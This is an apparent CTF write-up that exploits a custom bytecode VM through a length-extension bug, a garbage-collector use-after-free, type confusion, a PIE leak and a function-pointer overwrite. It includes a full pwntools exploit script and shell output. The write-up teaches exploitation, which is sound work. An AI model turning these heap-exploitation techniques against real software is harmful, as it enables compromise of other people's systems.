# CTF Writeup: VM Heap Exploitation (UAF + Type Confusion + PIE Leak)

## Challenge Overview

This challenge involves exploiting a custom bytecode-interpreted Virtual Machine written in C. The VM manages its own objects and memory, but contains a chain of subtle vulnerabilities that, when combined, allow full arbitrary code execution.

**Vulnerability Chain:**
1. **Length Extension Bug** in `WRITEBUF` — tricks the VM into believing a buffer is fully initialized when it isn't
2. **GC Use-After-Free (UAF)** — the Garbage Collector blindly frees heap chunks without checking reference counts
3. **Type Confusion** — a freed chunk is reclaimed by a Builtin closure object, aliasing two objects onto the same memory
4. **PIE Leak** via `PRINTB` — the aliased buffer reads out a live function pointer, defeating ASLR/PIE
5. **Arbitrary Write** via `WRITEBUF` — overwrites the function pointer in place to redirect execution to `win()`

---

## Memory Architecture

Every VM variable consists of **two separate allocations**:

### 1. VM_Object (Metadata) — Stored in a 4MB mmap region

```c
struct VM_Object {
    uint32_t type;       // 0x00: 1=Buffer, 2=Slice, 3=Builtin
    uint32_t marked;     // 0x04: GC mark flag
    VM_Object* next;     // 0x08: Linked list for GC traversal
    uint32_t length;     // 0x10: Valid (readable) length of data
    uint32_t capacity;   // 0x14: Maximum allocated capacity
    void* raw_ptr;       // 0x18: Pointer to heap-allocated Raw_Buffer
};
```

### 2. Raw_Buffer (Data) — Allocated via `malloc()`

```c
struct Raw_Buffer {
    uint64_t capacity;   // Bytes 0–7: Mirrors the capacity value
    char data[];         // Bytes 8+:  Actual payload data
};
```

> **Key insight:** `PRINTB` does `fwrite(obj->raw_ptr + 8, 1, obj->length, stdout)`. It skips the 8-byte capacity header and reads `length` bytes. If `length` has been artificially inflated, it will read beyond the intended data — including anything that gets placed there later.

---

## Exploit Step-by-Step

### Step 1: `NEWBUF 32` — Allocate a 32-byte buffer

The VM calls `malloc(32 + 8)` = 40 bytes for the Raw_Buffer.

**Heap state after Step 1:**
```
VM Stack: [ VM_Obj_A ]
            ├── type:     1 (Buffer)
            ├── length:   0
            ├── capacity: 32
            └── raw_ptr:  0x55555555a000
                          ├── [0x00–0x07]: 0x0000000000000020  ← capacity header
                          └── [0x08–0x27]: ???  UNINITIALIZED  ???
```

---

### Step 2: `WRITEBUF offset=32, len=0` — The Length Extension Bug

The exact C logic:

```c
uint64_t offset    = 32;
uint64_t input_len = 0;

// SAFETY CHECK
if (offset + input_len > obj->capacity) crash();
// 32 + 0 = 32. NOT > 32. PASSES.

// READ (skipped because input_len == 0)
if (input_len != 0) read(stdin, obj->raw_ptr + 8 + offset, input_len);

// LENGTH EXTENSION BUG
if (offset + input_len > obj->length) {
    obj->length = offset + input_len;  // Sets length = 32 + 0 = 32
}
```

**The bug:** Writing 0 bytes at the very end of the buffer (offset 32) is technically within bounds, but it tricks the VM into setting `obj->length = 32` — treating all 32 bytes of uninitialized data as valid, readable content.

**State after Step 2:**
```
VM_Obj_A:
    length:   32   ← HACKED — was 0
    capacity: 32
```

---

### Step 3: `SLICE 0, 32` — Create an Aliased Pointer

The VM creates a new `VM_Object` of type Slice (type=2). Crucially, it **copies `raw_ptr` directly** from `VM_Obj_A` rather than allocating new heap memory.

```
VM Stack: [ VM_Obj_A, VM_Obj_B (Slice) ]
            ├── raw_ptr: 0x55555555a000 ←──┐
            └── raw_ptr: 0x55555555a000 ←──┘  SAME CHUNK
```

Both objects now point to the same heap chunk. There is no reference counter.

---

### Step 4: `DROP` + `GC` — Trigger the Use-After-Free

We pop `VM_Obj_B` off the stack and invoke the Garbage Collector.

**GC logic (sub_3BD0):**
1. Scan the VM stack → mark `VM_Obj_A` as **alive**
2. `VM_Obj_B` is not on the stack → marked **dead**
3. GC sweeps dead objects → calls `free(VM_Obj_B->raw_ptr)`

```c
// GC does NOT check: "Is anyone else using this chunk?"
free(VM_Obj_B->raw_ptr);  // Frees 0x55555555a000
```

**State after Step 4:**
```
VM Stack: [ VM_Obj_A ]
            └── raw_ptr: 0x55555555a000 → FREED HEAP CHUNK  ← UAF!
```

`VM_Obj_A` is still alive on the stack and still holds a pointer to freed memory. This is the Use-After-Free primitive.

---

### Step 5: `BUILTIN 0` — Heap Grooming / Type Confusion

We allocate a Builtin Closure object (type=3). The VM calls `malloc()` requesting ~32 bytes.

Because of glibc's **tcache/freelist** behavior, `malloc()` returns the **exact chunk we just freed** (`0x55555555a000`). The VM then writes a native C function pointer into this chunk:

```
Heap: 0x55555555a000
    [0x00–0x07]: 0x0000000000000020        ← capacity (32)
    [0x08–0x15]: 0x00005f99a7dce1d0        ← &sub_31D0 (function pointer!)
    [0x16–0x23]: 0x0000000000000000        ← Builtin ID 0
```

**Type Confusion established:**
- `VM_Obj_A` (Buffer)  → sees `0x55555555a000` as raw string data
- `VM_Obj_C` (Builtin) → sees `0x55555555a000` as an executable function pointer

---

### Step 6: `PRINTB` on `VM_Obj_A` — PIE/ASLR Leak

```c
// PRINTB implementation
fwrite(obj->raw_ptr + 8, 1, obj->length, stdout);
```

- Starts reading at `raw_ptr + 8` (skips capacity header)
- Reads `obj->length` = **32 bytes** (inflated in Step 2)
- The **first 8 bytes** at `raw_ptr + 8` are `&sub_31D0` — a live PIE address!

**In the exploit script:**
```python
leak_data = r.recv(32)
func_ptr_leak = u64(leak_data[0:8])
pie_base = func_ptr_leak - 0x31D0      # sub_31D0's offset
win_func  = pie_base + 0x3000          # win()'s offset
```

PIE defeated. ASLR defeated. We now know the exact address of `win()`.

---

### Step 7: `WRITEBUF offset=0, len=8` — Arbitrary Write

```c
// WRITEBUF implementation
read(stdin, obj->raw_ptr + 8 + offset, input_len);
// With offset=0, len=8:
read(stdin, obj->raw_ptr + 8, 8);
```

We send `p64(win_func)` from Python. This overwrites exactly 8 bytes at `raw_ptr + 8` — the precise location of `VM_Obj_C`'s stored function pointer.

**Final heap state:**
```
Heap: 0x55555555a000
    [0x00–0x07]: 0x0000000000000020        ← capacity
    [0x08–0x15]: 0x00005f99a7dc3000        ← win() address  ← OVERWRITTEN
    [0x16–0x23]: 0x0000000000000000        ← Builtin ID 0
```

---

### Step 8: `CALL` on `VM_Obj_C` — Shell

The VM dispatches the Builtin, jumps to `raw_ptr + 8`, and lands directly in `win()`.

```
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag
CTF{...}
```

---

## Exploit Script (Python / pwntools)

> **Note:** Three critical details to be aware of:
> 1. `WRITEBUF` and `PRINTB` **consume** (pop) the object from the stack — always `DUP` before calling them if you need the object again.
> 2. `CALL` opcode is `0x41`, **not** `0x50` (that's `JMP`).
> 3. The binary expects a **4-byte little-endian length header** (`p32(len(payload))`) prepended to every bytecode payload sent over stdin.

```python
from pwn import *

# Adjust binary path and offsets accordingly
elf = ELF('./sarcasm_patched', checksec=False)
r   = process('./sarcasm_patched')  # or remote(HOST, PORT)

SUB_31D0_OFFSET = 0x31D0
WIN_OFFSET      = 0x3000

# Opcode helper functions
def newbuf(size):   return bytes([0x20, size])
def writebuf(o, l): return bytes([0x25, o, l])
def slice_op(s, e): return bytes([0x22, s, e])
def dup():          return bytes([0x02])
def swap():         return bytes([0x03])
def drop():         return bytes([0x04])
def gc():           return bytes([0x60])
def builtin(idx):   return bytes([0x40, idx])
def printb():       return bytes([0x23])
def push(val):      return bytes([0x01, val])
def call(argc):     return bytes([0x41, argc]) # Fixed opcode (0x41)

# Stage 1: Length extension + UAF setup
payload  = b""
payload += newbuf(32)
payload += dup()                 # Keep buffer on stack
payload += writebuf(32, 0)       # Inflate length to 32
payload += dup()                 # Keep buffer on stack
payload += slice_op(0, 32)       # Create aliased slice
payload += drop()                # Pop slice (but keep raw_ptr alive in VM_Obj_A)
payload += gc()                  # GC frees the chunk (UAF triggered)
payload += builtin(0)            # Reclaim freed chunk with Builtin closure
payload += swap()                # Bring Buffer to top
payload += dup()                 # Keep Buffer on stack for the overwrite
payload += printb()              # Leak the function pointer

# Send header length + payload
r.send(p32(len(payload)) + payload)

# Stage 2: Parse leak
leak_data = r.recv(32)
func_ptr  = u64(leak_data[0:8])
pie_base  = func_ptr - SUB_31D0_OFFSET
win_addr  = pie_base + WIN_OFFSET
log.success(f"PIE base:  {hex(pie_base)}")
log.success(f"win() at:  {hex(win_addr)}")

# Stage 3: Overwrite function pointer + trigger
# Currently on stack: [Builtin, Buffer]
payload2  = writebuf(0, 8)       # Consumes Buffer, waits for 8 bytes from stdin
payload2 += push(0)              # Push dummy argument for Builtin (arity 1)
payload2 += swap()               # Stack: [0, Builtin]
payload2 += call(1)              # Trigger code execution

r.send(p32(len(payload2)) + payload2)
r.send(p64(win_addr))            # Send the 8 bytes for WRITEBUF

r.interactive()
```

---

## Vulnerability Summary

| Step | Technique | Effect |
| :--- | :--- | :--- |
| `WRITEBUF(32, 0)` | Off-by-logic / Length Extension | `length` set to 32, exposes uninitialized memory |
| `SLICE` + `DROP` + `GC` | Use-After-Free | Heap chunk freed while `VM_Obj_A` still holds a dangling pointer |
| `BUILTIN 0` | Heap Grooming | Freed chunk reclaimed; function pointer written at known offset |
| `PRINTB` | Type Confusion + Info Leak | Buffer read leaks live PIE address from Builtin's function pointer slot |
| `WRITEBUF(0, 8)` | Arbitrary Write | Function pointer overwritten with `win()` address |
| `CALL` | Code Execution | VM dispatches to `win()`, spawning shell |

---

## Key Concepts to Remember

**Why does malloc() give back the exact freed chunk?**
glibc's tcache bins cache recently freed chunks of the same size. When you `free()` a 40-byte chunk and immediately `malloc(40)`, tcache returns it instantly. Heap grooming reliability depends on controlling allocation order and sizes.

**Why does the GC not check reference counts?**
This VM uses a simple mark-and-sweep GC. It only looks at what's on the VM stack. It has no concept of multiple objects sharing a `raw_ptr`. This is a classic GC design flaw in manual-memory VMs.

**Why does `WRITEBUF(32, 0)` pass the bounds check?**
The check is `offset + input_len > capacity`, which is `32 + 0 > 32` = `false`. Writing zero bytes at the boundary is allowed. The length update logic is a separate, unguarded path that runs unconditionally after the check.

**Why is PIE relevant?**
The binary is compiled with Position Independent Executable (PIE), meaning all code addresses are randomized at load time. By reading a live function pointer from the heap, we recover the runtime base address and can compute the address of any symbol.
